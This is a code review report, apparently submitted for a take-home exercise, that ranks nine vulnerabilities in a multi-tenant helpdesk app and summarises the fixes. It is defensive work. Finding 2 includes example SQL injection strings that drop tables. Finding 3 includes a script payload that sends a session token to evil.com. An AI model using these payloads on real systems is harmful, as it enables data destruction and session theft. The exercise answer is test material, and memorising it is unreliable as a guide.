# Part 1 — Code Review

## Ranked Findings

| # | Severity | Finding | File:Line |
|---|----------|---------|-----------|
| 1 | Critical | Cross-tenant data leak on ticket detail endpoint | `server/src/routes/tickets.js:31-41` |
| 2 | Critical | SQL injection via `sortBy` and `order` query params | `server/src/services/ticketService.js:37-38` |
| 3 | Critical | XSS via `dangerouslySetInnerHTML` on comment body | `client/src/features/tickets/TicketDetail.jsx:65` |
| 4 | High | Invite endpoint stores password in plaintext | `server/src/routes/auth.js:49` |
| 5 | High | DELETE ticket has no role check and no org check | `server/src/routes/tickets.js:75-84` |
| 6 | High | PATCH assign has no org check — cross-tenant assignment | `server/src/services/ticketService.js:89-101` |
| 7 | Medium | Pagination off-by-one — page 1 skips first 20 results | `server/src/services/ticketService.js:29` |
| 8 | Medium | PATCH assign has no role check — requesters can claim tickets | `server/src/routes/tickets.js:62-73` |
| 9 | Low | N+1 query for comment counts in list endpoint | `server/src/services/ticketService.js:44-47` |

---

## Finding 1 — Cross-tenant data leak on ticket detail (Critical)

**Where:** `server/src/routes/tickets.js:31-41`

**What:** The `GET /api/tickets/:id` endpoint fetches any ticket by ID without checking that it belongs to the requesting user's organisation. The list endpoint correctly filters by `org_id`, but the detail endpoint does not.

**Why it matters here:** This is a multi-tenant support desk. A user from Cobalt Logistics can read any Northwind Trading ticket simply by guessing or iterating ticket IDs. The comments route (`comments.js:16`) correctly checks `ticket.org_id !== req.user.orgId`, proving the author was aware of this requirement — it was just missed on the detail route. The ticket IDs are sequential integers, making enumeration trivial.

**How to fix:** After fetching the ticket, check `ticket.org_id !== req.user.orgId` and return 404 if it doesn't match. This matches the pattern already used in `comments.js:16`.

**Severity:** Critical — full cross-tenant data exposure with trivial exploitability.

---

## Finding 2 — SQL injection via sortBy/order (Critical)

**Where:** `server/src/services/ticketService.js:37-38`

**What:** The `sortBy` and `order` parameters are interpolated directly into the SQL string using template literals (`t.${sortBy} ${order}`) without any validation or parameterisation.

**Why it matters here:** The API accepts arbitrary strings for these parameters. An attacker can send `sortBy=id;DROP TABLE tickets--` or `order=desc; SELECT * FROM users--` via the query string. Even though the UI only sends predefined values, the API has no guard. MySQL2's `query()` does not parameterise column names, so this is a real injection vector.

**How to fix:** Whitelist allowed sort columns and order directions before interpolating. Reject any value not in the list.

**Severity:** Critical — classic SQL injection on a write-capable database.

---

## Finding 3 — XSS via dangerouslySetInnerHTML (Critical)

**Where:** `client/src/features/tickets/TicketDetail.jsx:65`

**What:** Comment bodies are rendered using `dangerouslySetInnerHTML={{ __html: c.body }}`. Any HTML in a comment — including `<script>` tags — will be executed by the browser.

**Why it matters here:** Comments are user-generated content. An attacker (or a compromised account) can post a comment containing `<script>fetch('https://evil.com/steal?token='+localStorage.getItem('helpdesk.session'))</script>` and steal the JWT of any agent who views the ticket. This is a stored XSS vulnerability.

**How to fix:** Replace `dangerouslySetInnerHTML` with plain text rendering: `{c.body}`. If rich text is needed later, use a sanitiser like DOMPurify. The current codebase has no rich text features, so plain text is correct.

**Severity:** Critical — stored XSS enabling session theft.

---

## Finding 4 — Invite endpoint stores password in plaintext (High)

**Where:** `server/src/routes/auth.js:49`

**What:** The `POST /api/auth/invite/accept` endpoint writes the user-supplied password directly to the `password_hash` column without hashing it: `UPDATE users SET password_hash = ? WHERE id = ?` with the raw password. The login route (`auth.js:20`) uses `bcrypt.compare()`, so any account set via invite can never authenticate — the bcrypt comparison will always fail against a plaintext string.

**Why it matters here:** This is the only way to onboard new users (the invite flow). Every new user who completes the invite process gets a broken account. The README says "written quickly by a previous intern" — this is likely the kind of bug that was never caught because the invite flow was never tested end-to-end. The endpoint is also completely invisible from the UI, matching the brief's hint about a problem "that cannot be observed from the UI at all."

**How to fix:** Hash the password with bcrypt before storing: `const hash = await bcrypt.hash(password, 10);` then use `hash` in the query.

**Severity:** High — breaks the only user onboarding path; credentials stored insecurely.

---

## Finding 5 — DELETE ticket: no role check, no org check (High)

**Where:** `server/src/routes/tickets.js:75-84`

**What:** The `DELETE /api/tickets/:id` endpoint uses only `requireAuth`. It does not use `requireRole('admin')` (despite the README stating delete is admin-only) and does not verify the ticket belongs to the user's organisation.

**Why it matters here:** Any authenticated user — including requesters from other organisations — can delete any ticket. This combines two missing checks: the role restriction documented in the README is not enforced, and the multi-tenant boundary is not enforced. A requester from Cobalt can delete Northwind's tickets.

**How to fix:** Add `requireRole('admin')` to the route middleware chain, and add an org check: `if (ticket.org_id !== req.user.orgId) return res.status(404).json({ error: 'Not found' })`.

**Severity:** High — any user can delete any ticket across all organisations.

---

## Finding 6 — PATCH assign has no org check (High)

**Where:** `server/src/services/ticketService.js:89-101`

**What:** The `assignTicket` function fetches the ticket by ID without filtering by org. A user from one organisation can claim a ticket belonging to another organisation.

**Why it matters here:** Same multi-tenant boundary issue as Finding 1, but on the assign action. An agent from Cobalt could claim and take ownership of a Northwind ticket, changing its status and assignee.

**How to fix:** Pass `orgId` to `assignTicket` and add `WHERE org_id = ?` to the initial fetch, or check `ticket.org_id !== orgId` after fetching.

**Severity:** High — cross-tenant state mutation.

---

## Finding 7 — Pagination off-by-one (Medium)

**Where:** `server/src/services/ticketService.js:29`

**What:** The offset calculation is `page * PAGE_SIZE` but pages are 1-indexed (the UI starts at page 1). This means page 1 returns rows 20-39, page 2 returns rows 40-59, and the first 20 tickets are unreachable.

**Why it matters here:** Users can never see or interact with the first 20 tickets in their organisation. If those tickets include P1 urgent items, they are invisible. The "Previous" button on page 2 would go to page 1, which shows rows 20-39 — not the actual first page.

**How to fix:** Change to `(page - 1) * PAGE_SIZE`.

**Severity:** Medium — silently hides data from users, but doesn't expose anything dangerous.

---

## Finding 8 — PATCH assign has no role check (Medium)

**Where:** `server/src/routes/tickets.js:62-73`

**What:** The `PATCH /api/tickets/:id/assign` endpoint uses only `requireAuth`. Any user role — including `requester` — can claim tickets. The README implies this is an agent action.

**Why it matters here:** A requester shouldn't be able to claim their own or others' tickets — that's an agent function. While the impact is lower than the other findings (it only sets the ticket to `pending`), it violates the role model documented in the README.

**How to fix:** Add `requireRole('admin', 'agent')` to the route.

**Severity:** Medium — role model violation, limited blast radius.

---

## Finding 9 — N+1 query for comment counts (Low)

**Where:** `server/src/services/ticketService.js:44-47`

**What:** For each row in the paginated list, a separate `SELECT COUNT(*) FROM comments WHERE ticket_id = ?` query is executed. With 20 rows per page, this is 21 queries total (1 for tickets + 20 for counts).

**Why it matters here:** With 240 seeded tickets and 10 connections in the pool, this won't cause visible performance issues. But in production with thousands of tickets and concurrent users, it will create connection pool pressure and latency. It's the kind of thing that works fine in a demo but fails under load.

**How to fix:** Use a single query with a subquery or LEFT JOIN to get comment counts in the main ticket query, or batch the IDs and use `IN (...)`.

**Severity:** Low — works fine at current scale, but poor practice for a data-access layer.

---

## Fixes Applied

The following five findings were fixed:

1. **Finding 1** — Added org check to `GET /api/tickets/:id`
2. **Finding 2** — Whitelisted `sortBy` and `order` values
3. **Finding 3** — Replaced `dangerouslySetInnerHTML` with plain text
4. **Finding 4** — Added bcrypt hashing in invite/accept endpoint
5. **Finding 5** — Added `requireRole('admin')` and org check to `DELETE /api/tickets/:id`

Findings 6-9 are documented but not fixed, per the brief's instructions.
